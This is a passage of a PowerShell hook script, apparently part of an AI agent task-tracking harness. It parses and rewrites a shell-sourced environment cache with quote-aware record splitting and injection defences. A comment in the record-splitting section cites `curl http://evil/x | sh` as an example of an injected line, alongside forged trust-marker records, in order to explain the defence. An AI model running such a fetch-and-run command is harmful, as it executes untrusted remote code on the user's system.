    $raw = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)
    $lines = @($raw -split "`n")
    # Write-EnvCache terminates the LAST line too, so a faithful split yields a
    # trailing empty element that is not a line. Drop exactly that one — never
    # blank lines elsewhere, which bash would also keep. The Count -le 1 arm is
    # not a micro-optimisation: 0..($lines.Count - 2) on a one-element array is
    # 0..-1, which PowerShell walks DOWNWARDS as @(0, -1) and would duplicate
    # the very element being dropped. An empty file must yield no lines.
    if ($lines.Count -le 1) {
        if ($lines.Count -eq 1 -and $lines[0] -eq '') { return @() }
        return $lines
    }
    if ($lines[-1] -eq '') { $lines = @($lines[0..($lines.Count - 2)]) }
    return $lines
}

# Group the cache's physical lines into RECORDS, tracking sh quote state.
#
# (D280 r3) Agreeing on what a LINE is was not enough; the pass-through filters
# also have to agree on what a RECORD is, because they DROP things. The bash
# twin writes a multi-line value as one sq_escaped assignment spanning several
# physical lines — inert to its own `source`, which reassembles it — and a
# line-oriented filter then drops the record's OPENING line while keeping its
# interior. Write-EnvCache re-joins what survived, so an interior line such as
# `curl http://evil/x | sh` is PROMOTED to a top-level cache line, and bash
# executes it on the next `. "$ENV_CACHE"` under `set -a`. A promoted
# `TASK_BASE_REF_TRUSTED=1` or `TASK_BASE_REF=<sha>` forges D226's trust marker
# just as effectively. This is the same class as the CR bug, one layer up: there
# the reader manufactured a record, here the filter dismembers one.
#
# The scanner is sh's, not a regex: OUTSIDE a quoted run a backslash escapes the
# next character and `'` opens a run; INSIDE, a backslash is literal and `'`
# closes. That distinction is exactly why parity-counting quotes does not work —
# sq_escape renders an embedded quote as `'\''`, whose middle quote is
# backslash-escaped OUTSIDE the run and must not flip the state.
#
# SCOPE, stated so a future reader does not assume more: the scanner models
# SINGLE-quoted runs and backslash escapes. It does NOT model double-quoted
# runs or `#` comments, so it diverges from sh on inputs only a legacy or
# hand-authored cache can hold. Two shapes, both fail-closed:
#   `A="x<LF>MARKER<LF>"` splits into separate records and MARKER stands alone;
#   a bare pre-D280 title of `He said "don't"` is ONE line to sh (the
#   apostrophe sits inside double quotes) while this scanner opens a run at it
#   and may refuse the whole file.
# Neither can promote an interior line — the failure is always a merge or a
# refusal — and the next claim truncates and rewrites the cache quoted, so a
# legacy cache self-heals within one window.
# That is deliberate rather than overlooked, on two grounds. The bash twin's own
# awk filter has the identical gap, so closing it here alone would make the two
# executors disagree about where records end — the very thing this function
# exists to prevent. And it is unreachable from either writer: everything goes
# through sq_escape / ConvertTo-ShSingleQuoted, which cannot emit a bare `"`,
# backtick or `$(` outside a single-quoted run. Reaching it needs a cache
# authored by something else entirely, at which point the attacker already has
# write access to a file bash sources directly and needs no promotion step.
#
# Returns Ok=$false when the file ends INSIDE a quoted run. That is a truncated
# or hand-mangled cache, and the honest answer is "I cannot tell where the
# records are", so every caller skips its rewrite and leaves the previous cache
# intact rather than emitting a guess. Fail closed, exactly as the bash twin
# does. All six filters AND the bulk loader check it — the unparseable branch
# checks it too, and must, because that is the one site where falling through
# does not merely skip a rewrite: it reaches Remove-Item and deletes the cache.
function Split-EnvCacheRecord {
    $records = @()
    $current = $null
    $inQuote = $false
    foreach ($line in (Get-EnvCacheLine)) {
        if ($null -eq $current) { $current = $line } else { $current = $current + "`n" + $line }
        $i = 0
        # A backslash as the LAST character of a line, outside quotes, escapes
        # the newline itself — sh line continuation, so the record continues.
        # Measured against bash rather than assumed: `A=x\` followed by `B='y'`
        # is ONE assignment to bash (A becomes "xB=y"), and a scanner that
        # called them two records could drop the first and leave the second
        # standing alone, changing what the file means. Inside quotes a
        # backslash is literal, so this only applies to the outside state.
        $escapedNewline = $false
        while ($i -lt $line.Length) {
            $ch = $line[$i]
            if ($inQuote) {
                if ($ch -eq "'") { $inQuote = $false }
            } else {
                if ($ch -eq '\') {
                    if ($i -eq ($line.Length - 1)) { $escapedNewline = $true }
                    $i++
                }
                elseif ($ch -eq "'") { $inQuote = $true }
            }
            $i++
        }
        if (-not $inQuote -and -not $escapedNewline) {
            $records += $current
            $current = $null
        }
    }
    # Returns a RESULT OBJECT, not a bare array, and both halves of that are
    # scars. A bare array cannot signal failure: PowerShell unrolls an empty
    # array to $null on output, so `return $null` for the unterminated-quote
    # case is indistinguishable from an empty cache — which made every empty
    # cache take the failure path. And `return ,$records` to stop the unrolling
    # nests instead, because every caller wraps the call in @(): the result is
    # object[1]{object[N]}, which Write-EnvCache's [string[]] parameter
    # stringifies with $OFS, silently space-joining every record onto ONE line.
    # Measured: it collapsed the six identity keys into a single cache line.
    # A hashtable is returned whole, with no unrolling and no ambiguity.
    if ($inQuote) { return @{ Ok = $false; Records = @() } }
    if ($null -ne $current) { $records += $current }
    return @{ Ok = $true; Records = $records }
}

# Read a record from the FILE, with a strict full-line shape check.
#
# Mirror of bash's read_task_record. Returns @{ Found; Value } — absence and
# emptiness are DIFFERENT answers, because TASK_OWNED_<id>='' (a task that ran
# and owned nothing) is a real record whose misreading flips a verdict, and
# under StrictMode a caller writing `if ($v)` would collapse the two.
#
# WHY THE FILE AND NEVER THE PROCESS ENV: the env cannot represent
# absent-vs-empty; it is populated by a bulk loader that applies no shape check
# at all; and an exported variable from ANY ancestor process would forge a
# record for free. Reading the file is what makes the shape check meaningful.
#
# THE SHAPE CHECK IS THE SECURITY BOUNDARY. A server value carrying a newline
# on an ALLOWED key becomes a second physical line like `TASK_NARROWED_42=yes`
# — unquoted, so not KEY='value', so invisible here. To forge the shape an
# attacker must supply a ', and both escapers turn any ' into '\'', which
# breaks the [^']* class. That is why the defence is provable, not probable.
#
# No .Trim(), ever: the bulk loader trims, and if this reader did too then
# " TASK_NARROWED_42='yes'" would be a record here but not to bash's
# `grep '^TASK_...'` — the two executors would disagree about what a record IS.
function Read-TaskRecord {
    param([string]$Key)
    $absent = @{ Found = $false; Value = '' }
    if (-not $Key) { return $absent }
    if (-not (Test-Path $EnvCache)) { return $absent }
    # Split on LF ONLY, from the raw bytes — see Get-EnvCacheLine for why the
    # CR and the BOM both have to survive the trip to this regex, and why the
    # writer below now reads through the same function rather than its own.
    $lines = @()
    try {
        $lines = @(Get-EnvCacheLine)
    } catch { return $absent }
    # \z, not $ — the same house rule, and for the same reason, as
    # Get-TaskRecordKey's id gate: .NET's $ ALSO matches immediately before a
    # trailing newline, so `KEY='value'` followed by a newline and anything else
    # would pass. That is unreachable today only because Get-EnvCacheLine
    # guarantees LF-free lines — an invariant held in a DIFFERENT function. \z
    # makes this reader's shape check self-contained instead, so a future change
    # to the splitter cannot quietly widen what counts as a record. Behaviour is
    # identical under the current splitter. bash's `grep '$'` is a line-oriented
    # anchor and is already correct, so parity is unaffected.
    $re = New-Object System.Text.RegularExpressions.Regex ('^' + [regex]::Escape($Key) + "='([^']*)'\z")
    $last = $null
    foreach ($line in $lines) { if ($re.IsMatch($line)) { $last = $line } }
    if ($null -eq $last) { return $absent }
    return @{ Found = $true; Value = $re.Match($last).Groups[1].Value }
}

# File-backed readers (the three families bash reads through read_task_record).
function Get-TaskOwnedRecord {
    param([string]$TaskId)
    return (Read-TaskRecord -Key (Get-TaskOwnedKey -TaskId $TaskId))
}
function Get-TaskBaseAtRecord {
    param([string]$TaskId)
    return (Read-TaskRecord -Key (Get-TaskBaseAtKey -TaskId $TaskId))
}
function Get-TaskNarrowedRecord {
    param([string]$TaskId)
    return (Read-TaskRecord -Key (Get-TaskNarrowedKey -TaskId $TaskId))
}

# Environment-backed readers — the ported asymmetry described in the header.
# Both return '' for absent AND empty, exactly as bash's ${!_k:-} does.
# The .Trim("'") was this port's necessary addition back when the bulk loader
# set the RHS verbatim: bash got unquoting free from sourcing the file, and this
# side did not. (D280) That premise is GONE — the loader now unquotes through
# ConvertFrom-ShSingleQuoted, so these trims are no-ops on any cache this
# version writes. They are kept deliberately, not left by accident: a cache
# written by a pre-D280 ps1 quoted the record families but NOT the identity or
# base lines, so the two shapes coexist during an upgrade, and these families
# (hex SHAs, digits, yes/no) can never contain a quote for the trim to eat.
function Get-TaskBaseRefFor {
    param([string]$TaskId)
    $key = Get-TaskBaseRefKey -TaskId $TaskId
    if (-not $key) { return '' }
    $v = [System.Environment]::GetEnvironmentVariable($key, 'Process')
    if ($v) { $v = $v.Trim("'") }
    if (-not $v) { return '' }
    return $v
}
function Get-TaskHeadRefFor {
    param([string]$TaskId)
    $key = Get-TaskHeadRefKey -TaskId $TaskId
    if (-not $key) { return '' }
    $v = [System.Environment]::GetEnvironmentVariable($key, 'Process')
    if ($v) { $v = $v.Trim("'") }
    if (-not $v) { return '' }
    return $v
}

# Write one record: drop any existing line for the key, append the new one last.
#
# Appending last is what makes the reader's last-match-wins mean "the newest",
# and keeps the on-disk layout identical to bash's grep -v then printf.
#
# DELIBERATE DIVERGENCE — a value containing CR, LF or NUL is REFUSED rather
# than written. Bash would write it faithfully, but the record would then span
# two physical lines and BOTH readers' full-line check would reject it, so
# nothing is lost; and unlike bash, this port's bulk loader has no shape check,
# so a multi-physical-line record here would plant a forged KEY=value straight
# into the process environment. None of the five families can legitimately carry
# these characters (yes/no, epoch digits, hex SHAs, comma/.. ranges, and the
# two sentinels).
function Set-TaskRecord {
    param([string]$Key, [string]$Value)
    if (-not $Key) { return $false }
    if ($Value -match "[\r\n\0]") {
        [Console]::Error.WriteLine("stride-hook: refusing to record $Key " + [char]0x2014 + " the value contains a newline or NUL, which cannot survive the cache's one-line-per-record shape.")
        return $false
    }
    # (D282) Read, filter and commit under a compare-and-swap, retried a bounded
    # number of times. W2102 gave these writers production call sites inside
    # Invoke-FinalizeAfterDoing, which runs twice per completion and spans the
    # whole after_doing gate — minutes, with a git shell-out in the middle — so
    # a claim from a second agent in the same checkout can land between a read
    # and its rename and be lost wholesale. Before W2102 the writers had no
    # call sites and the window was unreachable.
    #
    # Each attempt re-reads, so a retry re-applies the delete-and-append against
    # the CONCURRENT writer's content rather than against our stale snapshot.
    # That is what makes the loop a fix and not just a repeat.
    # (D289) The retry loop D282 introduced here now lives in
    # Invoke-EnvCacheRewrite, because D289 needed the same guard at four more
    # sites and a sixth copy would have been the drift D288 spent a round on.
    # The guarantee is unchanged: each attempt re-reads, so a retry re-applies
    # the delete-and-append against the CONCURRENT writer's content rather than
    # against our stale snapshot.
    return (Invoke-EnvCacheRewrite -What $Key -Build {
        param($before)
        $kept = @()
        if ($null -ne $before) {
            # (W2101) Read through the SAME byte-faithful splitter the reader
            # uses. Get-Content here would re-terminate a CRLF line as LF and
            # split a CR-bearing value, so a write would change what the reader
            # - and bash - consider a record. Dropping the key is bash's
            # `grep -v '^KEY='`: prefix match, so a CRLF-terminated line for
            # this key goes too, exactly as it does there.
            # (D280 r3) RECORD-aware, not line-aware: dropping this key must
            # not dismember a multi-line record belonging to another key.
            $recs = Split-EnvCacheRecord
            if (-not $recs.Ok) { throw 'env cache ends inside a quoted value' }
            $kept = @($recs.Records |
                Where-Object { $_ -notmatch ('^' + [regex]::Escape($Key) + '=') })
        }
        return @(@($kept) + @($Key + '=' + (ConvertTo-ShSingleQuoted -Value $Value)))
    })
}

# The four writers. Guards mirror bash exactly, including which families have
# an orphan-base guard and which deliberately do not.
#
# The base guard uses Get-TaskBaseRefFor (an ENV read), not Read-TaskRecord.
# That is bash parity: bash's guard is `[ -n "$(task_base_ref_for ...)" ]`, an
# env read on that side too, so this port matches it read for read.
#
# (D280) The ORIGINAL reason recorded here no longer holds and is corrected
# rather than deleted, because it would mislead the next reader weighing a
# tighter guard. It used to say a strict-shape guard would find no base in any
# ps1-written cache, since this port's claim writer emitted TASK_BASE_REF_<id>
# unquoted. Invoke-FinalizeBeforeDoing now writes that key through
# ConvertTo-ShSingleQuoted, so a strict-shape guard WOULD find it. The env read
# stays anyway — on parity grounds, which is the durable reason — but "it would
# be permanently dead" is no longer true and is not the argument for keeping it.
function Set-TaskOwnedRecord {
    param([string]$TaskId, [string]$Value)
    $key = Get-TaskOwnedKey -TaskId $TaskId
    if (-not $key) { return $false }
    # Orphan-base rule: a window with no base partner is half-bounded and
    # unusable, so bash refuses to record ownership without one.
    if (-not (Get-TaskBaseRefFor -TaskId $TaskId)) { return $false }
    return (Set-TaskRecord -Key $key -Value $Value)
}
function Set-TaskNarrowedRecord {
    param([string]$TaskId, [string]$Value)
    $key = Get-TaskNarrowedKey -TaskId $TaskId
    if (-not $key) { return $false }
    # No base guard — bash's record_task_narrowed has none. Do not add one.
    return (Set-TaskRecord -Key $key -Value $Value)
}
function Set-TaskHeadRefRecord {
    param([string]$TaskId, [string]$Head)
    $key = Get-TaskHeadRefKey -TaskId $TaskId
    if (-not $key) { return $false }
    if (-not (Get-TaskBaseRefFor -TaskId $TaskId)) { return $false }
    $value = $Head
    if (-not $value) {
        try {
            $value = (& git -C $ProjectDir rev-parse HEAD 2>$null | Out-String).Trim()
            if ($LASTEXITCODE -ne 0) { $value = '' }
        } catch {
            $value = ''
        }
    }
    if (-not $value) { return $false }
    # Bash's record_task_head_ref hand-rolls its quoting instead of calling
    # sq_escape. For a SHA the two are byte-identical, so faithfulness costs
    # nothing — but that form is safe only by an argument about the value's
    # domain, and this writer accepts a -Head override, so the argument does not
    # hold here. One escaper is the same single-choke-point discipline D269
    # imposed on the key builder.
    return (Set-TaskRecord -Key $key -Value $value)
}
function Set-TaskBaseAtRecord {
    param([string]$TaskId, [string]$Epoch)
    $key = Get-TaskBaseAtKey -TaskId $TaskId
    if (-not $key) { return $false }
    # No base guard: bash's inline stamp sits inside the branch that has just
    # written the base itself.
    $value = $Epoch
    if (-not $value) {
        $epochStart = New-Object DateTime 1970, 1, 1, 0, 0, 0, ([DateTimeKind]::Utc)
        $value = [string][int64][math]::Floor(([DateTime]::UtcNow - $epochStart).TotalSeconds)
    }
    # Digits-only, mirroring bash's `case '' | *[!0-9]*` rejection. \z for the
    # same reason as Get-TaskRecordKey: $ would admit a trailing newline.
    if ($value -notmatch '^[0-9]+\z') { return $false }
    return (Set-TaskRecord -Key $key -Value $value)
}

# (W2102) Carry a surviving base record's PARTNER records across a cache
# rewrite, by RE-EMITTING them rather than copying their lines.
#
# Both cache rewrites keep only TASK_BASE_REF_<id> and drop the other four
# families, so every head/owned/base_at/narrowed record written by the
# attribution engine would die at the very next claim. The bash twin already
# re-emits two of these families for the same reason (its "RE-EMIT it rather
# than copying the matched line" block), and this port owes the same to all
# four now that it writes them.
#
# RE-EMIT, NEVER COPY THE RAW LINE, and never widen the caller's filter
# instead. Reading through Read-TaskRecord means the strict full-line
# ^KEY='[^']*'\z shape must hold, so a forged continuation is not a record and
# is dropped; re-quoting through ConvertTo-ShSingleQuoted means what lands is
# this executor's own escaping rather than bytes of unknown provenance. Widening
# the filter would carry the forgery through untouched, which is the exact
# failure D280's loader work exists to prevent.
#
# NO ORPHAN, for free: partners are derived from the base lines that SURVIVED,
# so a partner can never outlive its base. That is bash's kept-window gate
# obtained without porting the window selector, and it does not touch the
# Select-Object count cap - replacing that cap is W2103's task, and doing it
# here would confound attribution of any regression this commit causes.
#
# DELIBERATE DIVERGENCE from bash, stated rather than discovered: bash carries
# head/owned as raw lines out of its window selector, while this port carries
# all four through the reader. A malformed head/owned value is therefore
# dropped here and kept there. Fail-closed direction, and it is recorded in the
# parity note.
# (W2103/D274) Liveness sweep for OPEN windows - the replacement for D268's
# open-window COUNT cap, which could not tell a live enclosing outer from an
# abandoned claim and so evicted the outer. Returns the ids whose open window is
# provably dead, or an empty array. Mirror of bash's dead_open_window_ids.
#
# FAIL-SAFE BY CONSTRUCTION, because a false positive here is the exact data
# loss this subsystem exists to prevent:
#   * below the threshold it runs NO git at all and proves nothing dead;
#   * an unreadable repository returns empty, keeping every window;
#   * a base whose value is not even SHA-shaped is KEPT, not swept - unusable
#     is not the same as provably dead;
#   * a record is dead ONLY when its base does not resolve to a commit.
#
# THAT LAST POINT IS HALF OF WHAT Test-AnotherOpenWindowExists CHECKS, AND THE
# DIFFERENCE IS DELIBERATE - do not "share" the logic between them. That
# predicate also skips a base that is not an ancestor of HEAD and one whose age
# stamp is stale; this sweep must do NEITHER. Ancestry is a property of where
# HEAD points RIGHT NOW: a detached HEAD, a bisect, or a checkout of an older
# commit makes a live outer's base a non-ancestor for as long as that lasts.
# SKIPPING such a base is recoverable the moment HEAD comes back; DELETING its
# record is not, and one claim during a bisect with more than the threshold open
# would erase live anchors permanently - D274's own outcome through a different
# door. Non-resolution is the only irreversible signal, so it is the only one
# this sweep acts on.
#
# Openness is read from the cache FILE (base ids minus head ids), matching the
# selector this feeds - not from the environment, which is what the other
# predicate reads.
function Get-DeadOpenWindowId {
    param([int]$SweepAt, [string]$ReserveKey)
    $dead = @()
    if (-not (Test-Path $EnvCache)) { return $dead }
    $lines = @()
    try {
        $r = Split-EnvCacheRecord
        if (-not $r.Ok) { return $dead }
        $lines = @($r.Records)
    } catch { return $dead }

    $bases = New-Object System.Collections.Generic.List[object]
    $heads = New-Object System.Collections.Generic.HashSet[string]
    foreach ($line in $lines) {
        if ($line -match '^TASK_BASE_REF_([A-Za-z0-9_]+)=') {
            # Captured IMMEDIATELY, as the sibling Select-KeptWindowRecord does.
            # Reading $Matches[1] after the sentinel match below works only
            # because a FAILED -match leaves the previous match's $Matches
            # intact and the success branch continues - so inserting any regex
            # operation between the two, or a check that does not continue,
            # would silently mis-assign every window id. Not a defect today;
            # it is one waiting for an edit.
            $id = $Matches[1]
            $key = $line.Substring(0, $line.IndexOf('='))
            if ($key -match '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)\z') { continue }
            if ($ReserveKey -and $key -eq $ReserveKey) { continue }
            $bases.Add([pscustomobject]@{
                Id = $id
                Value = (ConvertFrom-ShSingleQuoted -Value $line.Substring($line.IndexOf('=') + 1))
            }) | Out-Null
        } elseif ($line -match '^TASK_HEAD_REF_([A-Za-z0-9_]+)=') {
            $null = $heads.Add($Matches[1])
        }
    }
    $open = @($bases | Where-Object { -not $heads.Contains($_.Id) })
    if ($open.Count -eq 0) { return $dead }
    # STRICTLY greater, and no git below it - the threshold test comes FIRST so
    # that is literally true, not merely true of git processes. At or under the
    # threshold this proves nothing dead and touches nothing.
    if ($open.Count -le $SweepAt) { return $dead }
    # NO GIT, NO EVIDENCE. Without this guard `& git` raises a terminating
    # CommandNotFoundException under $ErrorActionPreference = 'Stop', the claim
    # rewrite's catch sets its kept list to @(), and every surviving window
    # record is erased from the rebuilt cache - the exact opposite of this
    # function's own fail-safe contract. bash degrades with `|| return 0`.
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) { return $dead }
    $null = & git -C $ProjectDir rev-parse --verify --quiet HEAD 2>$null
    if ($LASTEXITCODE -ne 0) { return $dead }
    foreach ($w in $open) {
        # Only a SHA-shaped value can be PROVED absent; anything else is merely
        # unusable, which is not a licence to delete it.
        if (-not $w.Value) { continue }
        if ($w.Value -notmatch '^[0-9a-fA-F]+\z') { continue }
        $null = & git -C $ProjectDir rev-parse --verify --quiet ($w.Value + '^{commit}') 2>$null
        if ($LASTEXITCODE -ne 0) { $dead += $w.Id }
    }
    return $dead
}

# (W2103/D268+D274) Per-window eviction, replacing the per-family tail cap.
# Returns the BASE lines that survive; partners follow via
# Get-CarriedWindowRecordLine, which already keeps a partner exactly when its
# base survives - bash's no-orphan clause, obtained here for free.
#
# THE OLD CAP WAS WRONG IN BOTH DIRECTIONS. D268's per-family `tail -20` evicted
# the OLDEST record, which is structurally the longest-lived OUTER task's own
# anchor, so at 20 nested completions the outer uploaded an empty snapshot for
# real work. D274 then found that capping OPEN windows by count reached the same
# defect from the other side: the cap keeps the newest opens and drops the
# oldest, and the oldest open window is structurally the live enclosing outer,
# while the newer opens that triggered the eviction are exactly the ones kept.
# Measured on the hook itself - 19 open children left the outer intact, 20 lost
# both its anchor and its deliverable. No count cap can be made safe here.
#
# The rules, in order, and the order matters:
#   1. EVERY surviving open window is kept, however many there are. The only
#      opens already gone are ones the sweep PROVED dead.
#   2. anchor = the oldest kept open window.
#   3. CLOSED windows NEWER than the anchor are ALL kept - they are nested
#      inside a live outer's window, and evicting one would make the outer
#      absorb that nested task's commits: a wrong diff, strictly worse than
#      the no-diff this subsystem degrades to everywhere else.
#   4. CLOSED windows OLDER than every open window cap at 20, oldest evicted
#      first - a window predating every live claim cannot intersect any live
#      attribution.
#
# $ReserveKey is a base-ref KEY the caller is about to re-append for itself. It
# is dual-purpose, matching the pre-D274 reserved-slot arithmetic: the line is
# excluded AND the sweep threshold drops by one.
function Select-KeptWindowRecord {
    param([string]$ReserveKey)
    $sweepAt = $script:StrideOpenWindowSweepAt
    if ($ReserveKey) { $sweepAt = $sweepAt - 1 }
    $dead = @(Get-DeadOpenWindowId -SweepAt $sweepAt -ReserveKey $ReserveKey)

    $lines = @()
    try {
        $r = Split-EnvCacheRecord
        if (-not $r.Ok) { return @() }
        $lines = @($r.Records)
    } catch { return @() }

    $heads = New-Object System.Collections.Generic.HashSet[string]
    foreach ($line in $lines) {
        if ($line -match '^TASK_HEAD_REF_([A-Za-z0-9_]+)=') { $null = $heads.Add($Matches[1]) }
    }
    # Base records in CACHE ORDER - oldest first, which is what makes "oldest
    # kept open" and "evict oldest first" meaningful.
    $bases = New-Object System.Collections.Generic.List[object]
    foreach ($line in $lines) {
        if ($line -notmatch '^TASK_BASE_REF_([A-Za-z0-9_]+)=') { continue }
        $id = $Matches[1]
        $key = $line.Substring(0, $line.IndexOf('='))
        # UNPROVEN is excluded here as bash excludes it. The old cap A omitted
        # it, which was a latent divergence; building the exclusion into the
        # selector fixes both sites by construction.
        if ($key -match '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)\z') { continue }
        if ($ReserveKey -and $key -eq $ReserveKey) { continue }
        # A swept dead open window: its partners cannot survive it either, and
        # deriving partners from surviving bases drops them with it.
        if ($dead -contains $id) { continue }
        $bases.Add([pscustomobject]@{ Id = $id; Line = $line; Open = (-not $heads.Contains($id)) }) | Out-Null
    }
    if ($bases.Count -eq 0) { return @() }

    $keep = New-Object 'bool[]' $bases.Count
    for ($i = 0; $i -lt $bases.Count; $i++) { if ($bases[$i].Open) { $keep[$i] = $true } }
    $anchor = -1
    for ($i = 0; $i -lt $bases.Count; $i++) { if ($keep[$i]) { $anchor = $i; break } }
    # Closed windows OLDER than the anchor: walk DOWNWARD from the anchor and
    # keep the newest 20. The downward walk is the off-by-one hazard - with no
    # open window at all the limit is the whole list.
    $limit = if ($anchor -ge 0) { $anchor - 1 } else { $bases.Count - 1 }
    $c = 0
    for ($i = $limit; $i -ge 0; $i--) {
        if (-not $bases[$i].Open) { $c++; if ($c -le 20) { $keep[$i] = $true } }
    }
    # Closed windows NEWER than the anchor: all kept.
    if ($anchor -ge 0) {
        for ($i = $anchor; $i -lt $bases.Count; $i++) { if (-not $bases[$i].Open) { $keep[$i] = $true } }
    }
    $out = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $bases.Count; $i++) { if ($keep[$i]) { $out.Add($bases[$i].Line) | Out-Null } }
    return $out.ToArray()
}

# (W2103/D273) The capture-time narrowing verdict for a task, from the per-task
# record FIRST and the state file's narrowed= line second. Empty means no
# verdict is on record and the caller must re-derive. Mirror of bash's
# resolve_capture_narrowing.
#
# THE PER-TASK RECORD IS PREFERRED FOR A REASON. The state file holds ONE task
# at a time and is TRUNCATED on every write, so the interleaved completion this
# whole fix is about - another task completing between a failed PUT and
# before_review - overwrites it with its own task id and the verdict is gone
# exactly when it is needed. A per-task record survives that, because a
# completion only rewrites the line it owns.
#
# Lifetime is bounded by the WINDOW, not by the next claim. Reads happen between
# a capture and that same completion's before_review; across a claim the record
# is re-emitted by Get-CarriedWindowRecordLine for as long as its base window
# survives eviction, and a re-claim of the SAME task clears that task's own
# stale verdict through -ExcludeTaskId. (An earlier version of this paragraph
# said the claim drops every verdict wholesale because the selector emits only
# the base family. That was true of the selector alone and false of both call
# sites, which pair it with the re-emit - and on this task, a comment asserting
# something the code does not do is the defect being reviewed, not a footnote.)
function Resolve-CaptureNarrowing {
    param([string]$TaskId, [string]$StateValue)
    if ($TaskId) {
        $rec = Get-TaskNarrowedRecord -TaskId $TaskId
        if ($rec.Found -and $rec.Value) { return $rec.Value }
    }
    return $StateValue
}

# (W2103/D273) Answer the D255 outermost gate for a RETRY. $Narrowed is the
# verdict the primary capture persisted for THIS task; empty means none is on
# record. Mirror of bash's replay_narrowing_decision.
#
# A VERDICT REACHED AT CAPTURE TIME IS A FACT ABOUT THAT CAPTURE. Re-deriving it
# at retry time asks a different question - the retry's view of which windows
# are open is not the capture's view - so a live re-derivation can narrow a
# window whose verdict was never computed, or widen one that was. Replay is the
# whole point; the fall-through to a live check exists only for the case where
# nothing was recorded at all.
function Invoke-ReplayNarrowingDecision {
    param([string]$Narrowed, [string]$TaskId)
    # -ceq, not -eq: PowerShell's -eq is case-INsensitive, and bash's `case
    # yes)` is exact. bash states the rule at stride-hook.sh:1846 - only the
    # exact literal narrows, and a truncated write, a hand-edited line or a
    # tampered file falls through to the WIDE path, which over-reports but can
    # never lose this task's own work. A case-insensitive compare takes the
    # other direction on exactly those inputs. Not the round-6 harness rule in
    # reverse: that one widened a gate over Windows environment variable NAMES,
    # which really are case-insensitive; this compares a VALUE read out of a
    # file, where no platform argument applies.
    if ($Narrowed -ceq 'yes') { return $true }
    if ($Narrowed -eq '') { return [bool](Test-AnotherOpenWindowExists -SelfTaskId $TaskId) }
    return $false
}

function Get-CarriedWindowRecordLine {
    param([string[]]$BaseRecordLine, [string]$ExcludeTaskId)
    $out = New-Object System.Collections.Generic.List[string]
    foreach ($line in @($BaseRecordLine)) {
        if ($line -notmatch '^TASK_BASE_REF_([A-Za-z0-9_]+)=') { continue }
        $id = $Matches[1]
        if ($id -match '^(TRUSTED|OWNER|UNPROVEN)\z') { continue }
        # A claim clears its OWN stale verdict, as bash does; the partners of
        # every other surviving window are carried.
        if ($ExcludeTaskId -and $id -eq $ExcludeTaskId) { continue }
        foreach ($k in @(
            (Get-TaskHeadRefKey  -TaskId $id),
            (Get-TaskOwnedKey    -TaskId $id),
            (Get-TaskBaseAtKey   -TaskId $id),
            (Get-TaskNarrowedKey -TaskId $id)
        )) {
            # '' is Get-TaskRecordKey's digits-only refusal - the D269 guard.
            # Skipping here routes through that guard rather than around it.
            if (-not $k) { continue }
            $r = Read-TaskRecord -Key $k
            if (-not $r.Found) { continue }
            $out.Add($k + '=' + (ConvertTo-ShSingleQuoted -Value $r.Value)) | Out-Null
        }
    }
    return $out.ToArray()
}


# (D118) Canonical API-response snapshot. When present, after_goal detection,
# env forwarding, and the claim env-cache refresh prefer it over the harness-
# truncatable tool_response.stdout. Best-effort fast path only — the reliability
# guarantee is D119's hook-initiated fresh call.
$ResponseFile = Join-Path $ProjectDir '.stride/.last-api-response.json'

# (W2123) Loop state — the mirror of the bash twin's $LOOP_STATE_FILE. The Stop
# gate cannot refuse an action it has no evidence for, so a successful
# completion records that it happened and the next claim clears it. Written by
# the hook rather than the agent on purpose: an agent-written marker is exactly
# as skippable as the instruction it replaces.
$LoopStateFile = Join-Path $ProjectDir '.stride/.loop-state.json'

# (D234) Durable per-hook result — the mirror of the bash twin's
# write_hook_result. Invoke-StrideSection writes its structured JSON straight to
# the host stdout stream, but Claude Code's PreToolUse contract sends exit-0
# stdout to the transcript, NOT to the model, so on the success path there is
# nothing the agent can read a duration back from. This file is that channel.
#
# ONE FILE PER HOOK, not one keyed file: after_doing and before_review must not
# overwrite each other, and separate paths make that structural rather than
# something a writer has to remember.
#
# A MISSING FILE IS NORMAL AND MEANS "KEEP 0". In plugin mode every .stride.md
# section body is empty, the section returns before doing any work and emits
# nothing, and 0 is the truthful answer. Readers must never treat absence as an
# error, a retry, or a licence to invent a figure.
# (D238) Sections buffered for stdout. Claude Code parses a hook's stdout as ONE
# JSON document, and Invoke-StrideSection emits one object per section — so when
# a primary section AND `## after_goal` both ran, stdout carried two concatenated
# documents, a strict parse failed with "Extra data", and every harness-facing
# field in the stream was dropped. That is what made D228's
# hookSpecificOutput.additionalContext channel inert in the common configuration.
#
# Never verify this with jq: `jq .` and `jq -s` both accept a concatenated
# stream, which is exactly how a D228 guard test asserted the broken value and
# passed. Verify with a strict parser (python json.loads).
$script:PendingSections = @()

# One section -> that section's object, byte-identical to what shipped before.
# More than one -> a wrapper carrying them in order, with hookSpecificOutput
# hoisted to the root because the harness only reads the document root. The
# wrapper has no "hook" key and section objects always do, so
# `if .hook then <single> else .sections[] end` discriminates without guessing.
# Matches the bash twin's shape exactly (whitespace aside — this side emits
# compact JSON, that side pretty-prints, which predates D238).
function Emit-HookStdout {
    if ($script:PendingSections.Count -eq 0) { return }
    if ($script:PendingSections.Count -eq 1) {
        [Console]::Out.WriteLine($script:PendingSections[0])
        return
    }
    try {
        $objs = @($script:PendingSections | ForEach-Object { $_ | ConvertFrom-Json })
        $wrapper = [ordered]@{ sections = $objs }
        foreach ($o in $objs) {
            if ($o.PSObject.Properties.Name -contains 'hookSpecificOutput' -and $o.hookSpecificOutput) {
                $wrapper['hookSpecificOutput'] = $o.hookSpecificOutput
            }
        }
        [Console]::Out.WriteLine(($wrapper | ConvertTo-Json -Depth 8 -Compress))
    } catch {
        # Never lose the primary result to a merge failure: emitting it alone is
        # strictly better than emitting a stream nothing can parse. The durable
        # per-hook result files (D234) still carry every section's detail.
        [Console]::Out.WriteLine($script:PendingSections[0])
    }
}

function Get-HookResultFile {
    param([string]$Hook)
    return (Join-Path $ProjectDir (".stride/.hook-result-{0}.json" -f $Hook))
}

# Best-effort and never fatal: a hook must not fail because a duration could not
# be recorded. Written to a temp name then moved, so a reader never sees a
# half-file. Both paths are in .stride/, so the move is same-volume.
function Write-HookResult {
    param([string]$Hook, [string]$Json)
    # MUST be initialised before the try: Set-StrictMode -Version Latest (:14)
